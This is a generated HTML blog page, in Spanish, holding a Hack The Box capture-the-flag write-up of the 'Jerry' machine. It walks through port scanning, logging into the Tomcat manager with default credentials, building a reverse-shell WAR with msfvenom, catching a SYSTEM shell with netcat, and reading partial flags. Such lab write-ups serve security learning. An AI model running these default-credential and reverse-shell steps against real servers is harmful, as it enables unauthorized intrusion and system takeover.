@@ -1,0 +1,201 @@
+<!doctype html>
+<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>Bajo el teclado</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="" />
+
+    
+    
+    
+    <link rel="stylesheet" href="../../css/theme.min.css">
+
+    
+    
+    
+
+    
+  
+
+
+</head>
+<body>
+        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
+    <div class="row">
+        
+        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
+            <a href="../../" class="text-decoration-none">
+                <img id="home-image" class="rounded-circle"
+                    
+                        
+                            src="../../pointed.png"
+                        
+                    
+                />
+            </a>
+        </div>
+        <div class="col-sm-8 col-12 text-sm-left text-center">
+        
+            <h2 class="m-0 mb-2 mt-4">
+                <a href="../../" class="text-decoration-none">
+                    
+                        pointedsec
+                    
+                </a>
+            </h2>
+            <p class="text-muted mb-1">
+                
+                    if pentester.found == bug { make(pentester,states.happy) }
+                
+            </p>
+            <ul id="nav-links" class="list-inline mb-2">
+                
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../about/" title="About">About</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
+                    </li>
+                
+            </ul>
+            <ul id="nav-social" class="list-inline">
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="http://github.com/pointedsec" target="_blank">
+                            <i class="fab fa-github fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
+                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
+                            <i class="fas fa-at fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://pointedsec.vercel.app" target="_blank">
+                            <i class="fas fa-globe fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
+                            <i class="fas fa-box fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+    <hr />
+</header>
+<div class="container">
+    <div class="pl-sm-4 ml-sm-5">
+        <h1 id="hack-the-box-jerry-writeup">Hack The Box: Jerry Writeup</h1>
+<p>Bienvenidos a mi writeup detallado de la máquina fácil <strong>&ldquo;Jerry&rdquo;</strong> de Hack The Box. En este writeup vamos a resolver la máquina mas fácil de toda la plataforma probablemente. ¡Vamos a ello!</p>
+<h1 id="tcp-enumeration">TCP Enumeration</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.136.9 --ulimit <span style="color:#ae81ff">5000</span> -g
+</span></span><span style="display:flex;"><span>10.129.136.9 -&gt; <span style="color:#f92672">[</span>8080<span style="color:#f92672">]</span>
+</span></span></code></pre></div><h1 id="udp-enumeration">UDP Enumeration</h1>
+<p>No encontramos nada por UDP</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap --top-ports <span style="color:#ae81ff">1500</span> -sU --min-rate <span style="color:#ae81ff">5000</span> -n -Pn 10.129.136.9 -oN allPorts.UDP
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-07-31 18:03 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.136.9
+</span></span><span style="display:flex;"><span>Host is up.
+</span></span><span style="display:flex;"><span>All <span style="color:#ae81ff">1500</span> scanned ports on 10.129.136.9 are in ignored states.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1500</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 2.38 seconds
+</span></span></code></pre></div><p>Detectamos que por el puerto <code>8080/TCP</code> hay un servicio web, y es un Tomcat.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p8080 -sCV 10.129.136.9 -Pn -oN allPorts
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-07-31 18:02 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.136.9
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.038s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache-Coyote/1.1
+</span></span><span style="display:flex;"><span>|_http-open-proxy: Proxy might be redirecting requests
+</span></span><span style="display:flex;"><span>|_http-favicon: Apache Tomcat
+</span></span><span style="display:flex;"><span>|_http-title: Apache Tomcat/7.0.88
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 12.19 seconds
+</span></span></code></pre></div><p>Dirigiendonos a una ruta típica en los Tomcats..
+<code>http://10.129.136.9:8080/manager</code> intentamos poner admin:admin de credenciales y nos devuelve un código de estado 403, acceso denegado.</p>
+<p>Nos devuelve también las típicas credenciales por defecto de tomcat.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-XML" data-lang="XML"><span style="display:flex;"><span><span style="color:#f92672">&lt;user</span> <span style="color:#a6e22e">username=</span><span style="color:#e6db74">&#34;tomcat&#34;</span> <span style="color:#a6e22e">password=</span><span style="color:#e6db74">&#34;s3cret&#34;</span> <span style="color:#a6e22e">roles=</span><span style="color:#e6db74">&#34;manager-gui&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span></code></pre></div><p>Y probando estas credenciales&hellip;
+<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
+<p>Ahora simplemente quedaría subir un archivo <code>war</code> malicioso ya que tiene pinta que tenemos privilegios para subirlo.</p>
+<p>Con <code>msfvenom</code> creamos el <code>war</code> malicioso.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.71 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f war &gt; reverse.war
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">1091</span> bytes
+</span></span><span style="display:flex;"><span>Final size of war file: <span style="color:#ae81ff">1091</span> bytes
+</span></span></code></pre></div><p>Lo subimos al tomcat..
+<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
+<p>Nos ponemos en escucha por el puerto 443.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Ahora visitamos la aplicación maliciosa desplegada..
+<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
+<p>Y hemos ganado consola&hellip; ¿como <code>nt authority\system</code>?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.71<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.136.9<span style="color:#f92672">]</span> <span style="color:#ae81ff">49192</span>
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 6.3.9600<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2013</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\a</span>pache-tomcat-7.0.88&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span></code></pre></div><p>Vemos un directorio flags..</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Users\Administrator\Desktop<span style="color:#75715e">&gt;dir</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">dir</span>
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is 0834-6C04
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:\Users\Administrator\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>06/19/2018  07:09 AM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>06/19/2018  07:09 AM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>06/19/2018  07:09 AM    &lt;DIR&gt;          flags
+</span></span></code></pre></div><p>Y un archivo llamado <code>2 for the price of 1.txt</code></p>
+<p>Sin duda esta ha sido la máquina mas fácil que he resuelto en mi vida&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Users\Administrator\Desktop\flags<span style="color:#75715e">&gt;type &#34;2 for the price of 1.txt&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#e6db74">&#34;2 for the price of 1.txt&#34;</span>
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span>7004dbcef0f854...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root.txt
+</span></span><span style="display:flex;"><span>04a8b36e1545a4...
+</span></span></code></pre></div>
+    </div>
+
+    
+
+            </div>
+        </div><footer class="text-center pb-1">
+    <small class="text-muted">
+        
+            &copy; 2024, Andrés Del Cerro
+        
+        <br>
+        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
+        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
+    </small>
+</footer>
+</body>
+</html>
